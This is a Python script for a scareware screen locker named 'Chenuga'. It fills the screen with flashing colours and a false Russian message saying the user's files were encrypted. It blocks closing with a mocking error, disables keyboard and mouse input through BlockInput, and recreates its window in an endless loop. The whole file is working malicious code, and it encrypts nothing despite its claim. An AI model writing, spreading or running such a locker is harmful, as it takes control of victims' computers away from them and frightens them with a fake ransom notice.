import random
import tkinter as tk
from ctypes import *
from tkinter import ttk
from tkinter.messagebox import showerror

while True:
    window = tk.Tk()


    def open_error():
        showerror(title="Ошибка", message="Ваши попытки смехотворны")


    def disable_alt_f4():
        open_error()
        pass


    def animate():
        color = ["green", "blue", "purple", "brown", "black"]
        cls = random.choice(color)
        canvas.config(background=cls)
        canvas.after("100", animate)


    canvas = tk.Canvas(window, width=window.winfo_screenwidth(), height=window.winfo_screenheight())

    virus_name = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 5,
                                    text="Chenuga",
                                    font=("Helvetica", 36),
                                    anchor='center',
                                    fill="white")
    text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 50,
                              text="Ой, все ваши файлы были зашифрованы!",
                              font=("Helvetica", 14),
                              anchor='center',
                              fill="white")
    text = canvas.create_text(window.winfo_screenwidth() / 2, window.winfo_screenheight() / 2 + 70,
                              text="Что-же вы так неаккуратно...",
                              font=("Helvetica", 14),
                              anchor='center',
                              fill="white")

    window.attributes('-fullscreen', True)

    canvas.pack()
    animate()
    window.protocol("WM_DELETE_WINDOW", disable_alt_f4)
    windll.user32.BlockInput(True)
    window.mainloop()
